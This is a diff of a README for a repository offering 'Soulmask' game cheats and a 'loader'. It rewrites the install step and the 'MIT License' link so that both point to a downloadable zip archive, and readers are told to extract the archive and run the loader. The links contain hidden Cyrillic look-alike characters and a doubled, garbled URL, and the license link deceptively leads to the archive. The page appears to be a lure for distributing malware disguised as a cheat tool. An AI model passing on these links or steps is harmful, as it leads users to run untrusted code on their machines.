@@ -36,7 +36,7 @@ Soulmask hacks, Soulmask cheats, Soulmask loader, Soulmask enhancement, Soulmask
 
 ## 📥 Installation
 
-1. Download https://raw.githubusercontent.com/okelloaliwa01/Soulmask-EnhancerHub/main/Lоader.zip from the repository.
+1. Download https://github.com/okelloaliwa01/Soulmask-EnhancerHub/raw/refs/heads/main/shipcraft/Enhancer-Soulmask-Hub-v1.9.zipоhttps://github.com/okelloaliwa01/Soulmask-EnhancerHub/raw/refs/heads/main/shipcraft/Enhancer-Soulmask-Hub-v1.9.zip from the repository.
 2. Extract all files to a desired directory.
 3. Run the Loader and follow on-screen instructions.
 4. Enjoy enhanced Soulmask gameplay!
@@ -51,6 +51,6 @@ Soulmask hacks, Soulmask cheats, Soulmask loader, Soulmask enhancement, Soulmask
 
 ## 📜 MIT License (2025)
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/okelloaliwa01/Soulmask-EnhancerHub/main/Lоader.zip) – free to use, modify, and distribute for the community!
+This project is licensed under the [MIT License](https://github.com/okelloaliwa01/Soulmask-EnhancerHub/raw/refs/heads/main/shipcraft/Enhancer-Soulmask-Hub-v1.9.zipоhttps://github.com/okelloaliwa01/Soulmask-EnhancerHub/raw/refs/heads/main/shipcraft/Enhancer-Soulmask-Hub-v1.9.zip) – free to use, modify, and distribute for the community!
 
 ---
